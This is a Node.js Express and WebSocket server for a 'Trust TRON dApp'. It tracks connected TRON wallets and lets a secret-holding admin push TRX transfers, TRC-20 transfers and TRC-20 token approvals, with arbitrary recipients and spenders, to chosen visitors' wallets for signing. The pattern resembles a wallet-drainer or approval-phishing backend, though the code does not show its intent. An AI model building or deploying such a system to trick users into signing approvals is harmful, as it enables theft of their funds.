import "dotenv/config";
import cors from "cors";
import express from "express";
import fs from "node:fs";
import http from "node:http";
import path from "node:path";
import crypto from "node:crypto";
import { fileURLToPath } from "node:url";
import { WebSocketServer, WebSocket } from "ws";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const PORT = Number(process.env.PORT || process.env.ADMIN_SERVER_PORT || 8787);
const ADMIN_SECRET = (process.env.ADMIN_SECRET || "change-this-admin-secret").trim();
const MAX_REQUESTS = 500;
const MAX_EVENTS = 300;

const DATA_DIR = path.join(__dirname, "data");
const DATA_FILE = path.join(DATA_DIR, "store.json");
const ADMIN_PUBLIC_DIR = path.join(__dirname, "public-admin");

function nowIso() {
  return new Date().toISOString();
}

function baseStore() {
  return {
    wallets: {},
    requests: {},
    events: [],
  };
}

function ensureDataFile() {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
  if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(baseStore(), null, 2));
  }
}

function loadStore() {
  ensureDataFile();
  try {
    const parsed = JSON.parse(fs.readFileSync(DATA_FILE, "utf8"));
    return {
      wallets: parsed.wallets ?? {},
      requests: parsed.requests ?? {},
      events: parsed.events ?? [],
    };
  } catch {
    return baseStore();
  }
}

let store = loadStore();

function saveStore() {
  fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2));
}

function sortedWallets() {
  return Object.values(store.wallets).sort((a, b) =>
    String(b.lastSeen).localeCompare(String(a.lastSeen)),
  );
}

function sortedRequests() {
  return Object.values(store.requests)
    .sort((a, b) => String(b.createdAt).localeCompare(String(a.createdAt)))
    .slice(0, MAX_REQUESTS);
}

function sortedEvents() {
  return [...store.events]
    .sort((a, b) => String(b.timestamp).localeCompare(String(a.timestamp)))
    .slice(0, MAX_EVENTS);
}

function pruneRequests() {
  const requestIds = Object.keys(store.requests);
  if (requestIds.length <= MAX_REQUESTS) {
    return;
  }
  const staleIds = Object.values(store.requests)
    .sort((a, b) => String(b.createdAt).localeCompare(String(a.createdAt)))
    .slice(MAX_REQUESTS)
    .map((item) => item.id);

  for (const id of staleIds) {
    delete store.requests[id];
  }
}

function recordEvent(type, payload) {
  store.events.unshift({
    id: crypto.randomUUID(),
    type,
    payload,
    timestamp: nowIso(),
  });
  if (store.events.length > MAX_EVENTS) {
    store.events.length = MAX_EVENTS;
  }
}

function getPendingRequests(clientId) {
  return Object.values(store.requests)
    .filter((item) => item.clientId === clientId && item.status === "pending")
    .sort((a, b) => String(a.createdAt).localeCompare(String(b.createdAt)));
}

function getAdminSnapshot() {
  return {
    serverTime: nowIso(),
    wallets: sortedWallets(),
    requests: sortedRequests(),
    events: sortedEvents(),
  };
}

function normalizeErrorMessage(raw) {
  if (!raw) return "";
  if (typeof raw === "string") return raw;
  try {
    return JSON.stringify(raw);
  } catch {
    return String(raw);
  }
}

function validateRequestPayload(type, params) {
  if (typeof params !== "object" || params === null) {
    return "params must be an object";
  }

  if (type === "send_trx") {
    if (!params.to || !params.amount) {
      return "send_trx needs { to, amount }";
    }
    return "";
  }

  if (type === "trc20_transfer") {
    if (!params.token || !params.to || !params.amount) {
      return "trc20_transfer needs { token, to, amount, decimals? }";
    }
    return "";
  }

  if (type === "trc20_approve") {
    if (!params.token || !params.spender || !params.amount) {
      return "trc20_approve needs { token, spender, amount, decimals? }";
    }
    return "";
  }

  return "Unsupported request type";
}

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server, path: "/ws" });

const adminSockets = new Set();
const walletSockets = new Map();

function wsSend(socket, payload) {
  if (socket.readyState === WebSocket.OPEN) {
    socket.send(JSON.stringify(payload));
  }
}

function broadcastAdminSnapshot() {
  const snapshot = {
    type: "admin_snapshot",
    data: getAdminSnapshot(),
  };
  for (const socket of adminSockets) {
    wsSend(socket, snapshot);
  }
}

function addWalletSocket(clientId, socket) {
  if (!walletSockets.has(clientId)) {
    walletSockets.set(clientId, new Set());
  }
  walletSockets.get(clientId).add(socket);
}

function removeWalletSocket(clientId, socket) {
  const set = walletSockets.get(clientId);
  if (!set) return;
  set.delete(socket);
  if (set.size === 0) {
    walletSockets.delete(clientId);
  }
}

function sendRequestToWallet(clientId, request) {
  const set = walletSockets.get(clientId);
  if (!set) {
    return false;
  }
  for (const socket of set) {
    wsSend(socket, { type: "transaction_request", request });
  }
  return true;
}

function adminAuth(req, res, next) {
  const secret = (req.header("x-admin-secret") || "").trim();
  if (!secret || secret !== ADMIN_SECRET) {
    res.status(401).json({ error: "Unauthorized admin secret" });
    return;
  }
  next();
}

app.use(cors({ origin: true }));
app.use(express.json({ limit: "256kb" }));

app.get("/api/health", (_, res) => {
  res.json({ ok: true, serverTime: nowIso() });
});

app.post("/api/wallet/register", (req, res) => {
  const clientId = String(req.body?.clientId || "").trim();
  const address = String(req.body?.address || "").trim();
  const userAgent = String(req.body?.userAgent || "").trim();

  if (!clientId || !address) {
    res.status(400).json({ error: "clientId and address are required" });
    return;
  }

  const existing = store.wallets[clientId];
  const createdAt = existing?.createdAt ?? nowIso();
  const wallet = {
    clientId,
    address,
    connected: true,
    userAgent,
    createdAt,
    lastSeen: nowIso(),
  };

  store.wallets[clientId] = wallet;
  recordEvent("wallet.register", { clientId, address });
  saveStore();
  broadcastAdminSnapshot();

  res.json({ ok: true, wallet });
});

app.post("/api/wallet/heartbeat", (req, res) => {
  const clientId = String(req.body?.clientId || "").trim();
  if (!clientId) {
    res.status(400).json({ error: "clientId is required" });
    return;
  }

  if (store.wallets[clientId]) {
    store.wallets[clientId].lastSeen = nowIso();
    saveStore();
    broadcastAdminSnapshot();
  }

  res.json({ ok: true });
});

app.post("/api/wallet/disconnect", (req, res) => {
  const clientId = String(req.body?.clientId || "").trim();
  if (!clientId) {
    res.status(400).json({ error: "clientId is required" });
    return;
  }

  if (store.wallets[clientId]) {
    store.wallets[clientId].connected = false;
    store.wallets[clientId].lastSeen = nowIso();
    recordEvent("wallet.disconnect", { clientId, address: store.wallets[clientId].address });
    saveStore();
    broadcastAdminSnapshot();
  }

  res.json({ ok: true });
});

app.get("/api/wallet/:clientId/pending-requests", (req, res) => {
  const clientId = String(req.params.clientId || "").trim();
  if (!clientId) {
    res.status(400).json({ error: "clientId is required" });
    return;
  }
  res.json({ requests: getPendingRequests(clientId) });
});

app.post("/api/request/:requestId/result", (req, res) => {
  const requestId = String(req.params.requestId || "").trim();
  const clientId = String(req.body?.clientId || "").trim();
  const action = String(req.body?.action || "").trim();
  const txid = String(req.body?.txid || "").trim();
  const error = normalizeErrorMessage(req.body?.error);

  if (!requestId || !clientId || !action) {
    res.status(400).json({ error: "requestId, clientId, action are required" });
    return;
  }

  const request = store.requests[requestId];
  if (!request) {
    res.status(404).json({ error: "Request not found" });
    return;
  }

  if (request.clientId !== clientId) {
    res.status(403).json({ error: "This request does not belong to this wallet session" });
    return;
  }

  if (request.status !== "pending") {
    res.status(409).json({ error: "Request is no longer pending", request });
    return;
  }

  if (!["approved", "rejected", "failed"].includes(action)) {
    res.status(400).json({ error: "action must be approved, rejected, or failed" });
    return;
  }

  request.status = action;
  request.updatedAt = nowIso();
  request.txid = txid || "";
  request.error = error || "";
  store.requests[requestId] = request;

  if (store.wallets[clientId]) {
    store.wallets[clientId].lastSeen = nowIso();
  }

  recordEvent("request.result", {
    requestId,
    clientId,
    action,
    txid: request.txid,
    error: request.error,
  });
  saveStore();
  broadcastAdminSnapshot();

  res.json({ ok: true, request });
});

app.get("/api/admin/snapshot", adminAuth, (_, res) => {
  res.json(getAdminSnapshot());
});

app.get("/api/admin/wallets", adminAuth, (_, res) => {
  res.json({ wallets: sortedWallets() });
});

app.get("/api/admin/requests", adminAuth, (_, res) => {
  res.json({ requests: sortedRequests() });
});

app.get("/api/admin/events", adminAuth, (_, res) => {
  res.json({ events: sortedEvents() });
});

app.post("/api/admin/requests", adminAuth, (req, res) => {
  const clientId = String(req.body?.clientId || "").trim();
  const type = String(req.body?.type || "").trim();
  const params = req.body?.params ?? {};
  const note = String(req.body?.note || "").trim();

  if (!clientId || !type) {
    res.status(400).json({ error: "clientId and type are required" });
    return;
  }

  const wallet = store.wallets[clientId];
  if (!wallet) {
    res.status(404).json({ error: "Wallet session not found" });
    return;
  }

  const validationError = validateRequestPayload(type, params);
  if (validationError) {
    res.status(400).json({ error: validationError });
    return;
  }

  const id = crypto.randomUUID();
  const request = {
    id,
    clientId,
    address: wallet.address,
    type,
    params,
    note,
    status: "pending",
    createdAt: nowIso(),
    updatedAt: nowIso(),
    txid: "",
    error: "",
  };

  store.requests[id] = request;
  pruneRequests();
  recordEvent("request.create", {
    id,
    clientId,
    address: wallet.address,
    type,
  });
  saveStore();
  const delivered = sendRequestToWallet(clientId, request);
  recordEvent("request.dispatch", { id, clientId, delivered });
  saveStore();
  broadcastAdminSnapshot();

  res.json({ ok: true, delivered, request });
});

app.get("/admin", (_, res) => {
  res.sendFile(path.join(ADMIN_PUBLIC_DIR, "index.html"));
});
app.use("/admin", express.static(ADMIN_PUBLIC_DIR));

app.get("/", (_, res) => {
  res.type("text/plain").send(
    [
      "Trust TRON dApp backend is running.",
      `Admin panel: http://localhost:${PORT}/admin`,
      "Set ADMIN_SECRET in your .env before production usage.",
    ].join("\n"),
  );
});

wss.on("connection", (socket) => {
  let role = "";
  let clientId = "";

  socket.on("message", (raw) => {
    let payload;
    try {
      payload = JSON.parse(String(raw));
    } catch {
      wsSend(socket, { type: "error", message: "Invalid JSON message" });
      return;
    }

    if (payload.type !== "identify") {
      wsSend(socket, { type: "error", message: "identify message required first" });
      return;
    }

    const requestedRole = String(payload.role || "").trim();
    if (requestedRole === "admin") {
      if (String(payload.secret || "").trim() !== ADMIN_SECRET) {
        wsSend(socket, { type: "error", message: "Unauthorized admin secret" });
        socket.close();
        return;
      }

      role = "admin";
      adminSockets.add(socket);
      wsSend(socket, { type: "admin_snapshot", data: getAdminSnapshot() });
      return;
    }

    if (requestedRole === "wallet") {
      const nextClientId = String(payload.clientId || "").trim();
      if (!nextClientId) {
        wsSend(socket, { type: "error", message: "wallet identify requires clientId" });
        return;
      }

      role = "wallet";
      clientId = nextClientId;
      addWalletSocket(clientId, socket);
      wsSend(socket, { type: "wallet_pending", requests: getPendingRequests(clientId) });
      return;
    }

    wsSend(socket, { type: "error", message: "role must be admin or wallet" });
  });

  socket.on("close", () => {
    if (role === "admin") {
      adminSockets.delete(socket);
    }
    if (role === "wallet" && clientId) {
      removeWalletSocket(clientId, socket);
    }
  });
});

if (ADMIN_SECRET === "change-this-admin-secret") {
  console.warn(
    "[warning] ADMIN_SECRET is using default value. Set ADMIN_SECRET in .env for security.",
  );
}

server.listen(PORT, "0.0.0.0", () => {
  console.log(`[backend] running on http://0.0.0.0:${PORT}`);
  console.log(`[backend] admin panel: http://localhost:${PORT}/admin`);
});
